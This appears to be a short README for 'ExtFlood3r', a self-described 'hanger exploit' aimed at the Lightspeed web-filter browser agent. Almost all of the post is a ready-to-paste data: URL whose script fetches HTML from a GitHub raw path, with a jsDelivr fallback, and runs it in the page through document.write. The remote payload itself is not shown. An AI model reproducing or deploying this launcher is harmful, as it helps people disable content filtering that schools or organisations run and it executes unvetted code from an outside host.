# Currently this only works for lightspeed filter agent until I find out a way to fix
extflood3r 
another hanger exploit (bro its been only like a month since extprint3r 😭)

use dis url below:
```
data:text/html;charset=utf-8,<!DOCTYPE html>%0A<html lang%3D"en">%0A<head>%0A <meta charset%3D"UTF-8">%0A <meta name%3D"viewport" content%3D"width%3Ddevice-width%2C initial-scale%3D1.0">%0A <title>ExtFlood3r<%2Ftitle>%0A <link rel%3D"shortcut icon" type%3D"image%2Fpng" href%3D"TODO">%0A <script>%0A document.addEventListener("DOMContentLoaded"%2C () %3D> %7B%0A const main %3D "https%3A%2F%2Fraw.githubusercontent.com%2FBlobby-Boi%2FExtFlood3r%2Frefs%2Fheads%2Fmain%2Findex.html"%3B%0A const fallback %3D "https%3A%2F%2Fcdn.jsdelivr.net%2Fgh%2FBlobby-Boi%2FExtFlood3r%2Findex.html"%3B%0A%0A fetch(main)%0A .then(response %3D> %7B%0A if (!response.ok) throw new Error("Primary URL failed")%3B%0A return response.text()%3B%0A %7D)%0A .catch(() %3D> %7B%0A return fetch(fallback).then(response %3D> %7B%0A if (!response.ok) throw new Error("Fallback URL failed")%3B%0A return response.text()%3B%0A %7D)%3B%0A %7D)%0A .then(html %3D> %7B%0A document.open()%3B%0A document.write(html)%3B%0A document.close()%3B%0A %7D)%0A %7D)%3B%0A <%2Fscript>%0A<%2Fhead>%0A<%2Fhtml>
```
